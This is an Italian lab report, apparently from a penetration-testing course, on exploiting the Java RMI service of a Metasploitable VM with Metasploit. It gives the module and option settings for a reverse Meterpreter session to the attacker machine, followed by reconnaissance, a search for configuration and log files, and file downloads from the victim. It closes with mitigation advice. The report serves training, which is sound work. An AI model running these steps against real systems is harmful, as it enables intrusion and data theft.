# 🌟 Sfruttamento del Servizio Java RMI su Metasploitable 🌟

## 🚀 Introduzione
Questo esercizio aveva l'obiettivo di sfruttare una vulnerabilità del servizio Java RMI presente sulla macchina virtuale Metasploitable. Il processo di sfruttamento ha utilizzato Metasploit per ottenere una sessione remota Meterpreter sulla macchina vittima. Le evidenze raccolte includono la configurazione di rete e la tabella di routing della macchina vittima.

---

## ⚙️ Configurazione dell'Ambiente

### 🖥️ Macchine:
- **💻 Macchina Attaccante (Kali Linux)**: `192.168.11.111`
- **🎯 Macchina Vittima (Metasploitable)**: `192.168.11.112`

---

## 🛠️ Processo di Sfruttamento

### 1️⃣ Avvio di Metasploit
Il framework Metasploit è stato avviato utilizzando:
```bash
msfconsole
```

### 2️⃣ Configurazione dell'Exploit
È stato selezionato e configurato il modulo di exploit `exploit/multi/misc/java_rmi_server`:
```bash
use exploit/multi/misc/java_rmi_server
```
#### 🔧 Dettagli della Configurazione:
- **🎯 RHOSTS**: `192.168.11.112` (macchina vittima)
- **🔌 RPORT**: `1099` (porta Java RMI)
- **📡 LHOST**: `192.168.11.111` (macchina attaccante)
- **🔑 LPORT**: `4444` (porta per la connessione inversa)
- **⏳ HTTPDELAY**: `20` (modificato per gestire i problemi di timeout)

💻 **Comandi eseguiti:**
```bash
set RHOSTS 192.168.11.112
set RPORT 1099
set LHOST 192.168.11.111
set LPORT 4444
set HTTPDELAY 20
```

### 3️⃣ Esecuzione dell'Exploit
L'exploit è stato eseguito con successo:
```bash
exploit
```
🎉 **Risultato:** Una sessione Meterpreter è stata stabilita con la macchina vittima.

---

## 📝 Raccolta delle Evidenze

### 1️⃣ Configurazione di Rete
Sono stati eseguiti i seguenti comandi nella sessione Meterpreter:
```bash
ifconfig
```
📄 **Output:**
- **🌐 Interfaccia `eth0`**:
  - **📌 Indirizzo IPv4**: `192.168.11.112`
  - **📏 Netmask**: `255.255.255.0`
  - **🔗 Indirizzo MAC**: `08:00:27:44:36:7d`

### 2️⃣ Tabella di Routing
Il seguente comando è stato utilizzato:
```bash
route
```
📄 **Output:**
| 🌍 Destinazione     | 🚪 Gateway      | 📐 Genmask         | 🖥️ Interfaccia |
|------------------|--------------|-----------------|-------------|
| 192.168.11.0     | 0.0.0.0      | 255.255.255.0   | eth0        |
| 0.0.0.0          | 192.168.11.1 | 0.0.0.0         | eth0        |

### 3️⃣ Esportazione delle Evidenze
I file sono stati salvati e recuperati dalla macchina vittima:
```bash
ifconfig > /tmp/network_config.txt
netstat -rn > /tmp/routing_table.txt
download /tmp/network_config.txt
download /tmp/routing_table.txt
```
📂 **File salvati:**
- 📝 `network_config.txt` (dettagli della configurazione di rete)
- 📝 `routing_table.txt` (dettagli della tabella di routing)

---

## 🔍 Analisi Aggiuntiva

### 1️⃣ Informazioni sul Sistema
💻 **Comando eseguito:**
```bash
sysinfo
```
📄 **Output:**
- **🖥️ Nome Computer**: metasploitable
- **🛠️ Sistema Operativo**: Linux 2.6.24-16-server (i386)
- **🔢 Architettura**: x86
- **🌐 Lingua Sistema**: en_US
- **🤖 Meterpreter**: java/linux

### 2️⃣ Processi in Esecuzione
💻 **Comando eseguito:**
```bash
ps
```
📄 **Output:**
- La lista dei processi in esecuzione include:
  - `/sbin/init` (PID: 1)
  - Processi di sistema, come `apache2` (web server) e `mysqld` (database).

### 3️⃣ File Sensibili
#### 🛠️ File di Configurazione
💻 **Comando eseguito:**
```bash
search -f *.conf
```
📄 **Output:**
- **📂 File trovati:**
  - `/etc/apache2/apache2.conf`
  - `/etc/apache2/httpd.conf`
  - `/etc/fonts/fonts.conf`

#### 🗂️ File di Log
💻 **Comando eseguito:**
```bash
search -f *.log
```
📄 **Output:**
- **📂 File trovati:**
  - `/var/log/apache2/access.log`
  - `/var/log/auth.log`
  - `/var/log/daemon.log`

### 4️⃣ Esecuzione di Comandi Personalizzati
✅ È stato verificato che il sistema supporta l'interazione con la shell per ulteriori analisi, se necessario.

---

## 📸 Analisi degli Screenshot

### 🖼️ Screenshot 1: Configurazione dell'Exploit
- Mostra la configurazione del modulo di exploit di Metasploit.
- Parametri come `RHOSTS`, `RPORT`, `LHOST`, `LPORT` e `HTTPDELAY` sono stati configurati correttamente.

### 🖼️ Screenshot 2: Configurazione di Rete e Tabella di Routing
- Conferma l'esecuzione dei comandi `ifconfig` e `route`.
- Le evidenze raccolte includono la configurazione di rete e la tabella di routing.

### 🖼️ Screenshot 3: Download dei File
- Dimostra il recupero dei file `network_config.txt` e `routing_table.txt`.

### 🖼️ Screenshot 4: Informazioni sul Sistema e Processi
- Mostra i dettagli del sistema operativo e dei processi attivi.
- Identifica servizi critici come Apache2 e MySQL.

### 🖼️ Screenshot 5: Ricerca di File Sensibili
- Conferma la ricerca e il ritrovamento di file di configurazione e di log.

---

## ✅ Conclusioni
La vulnerabilità nel servizio Java RMI è stata sfruttata con successo per ottenere una sessione Meterpreter. Sono stati estratti i dettagli della configurazione di rete, della tabella di routing e ulteriori informazioni sul sistema, come i processi in esecuzione e i file sensibili. Le principali strategie di mitigazione includono:
- 🔒 Aggiornamento del servizio Java RMI a una versione sicura.
- 🔥 Restrizione dell'accesso al servizio tramite regole del firewall.
- 📊 Monitoraggio regolare dei log di sistema per rilevare attività sospette.

---

## 🗂️ File Consegnati
1. 📝 `network_config.txt`
2. 📝 `routing_table.txt`
3. 📝 Questo report (`readme.md`)
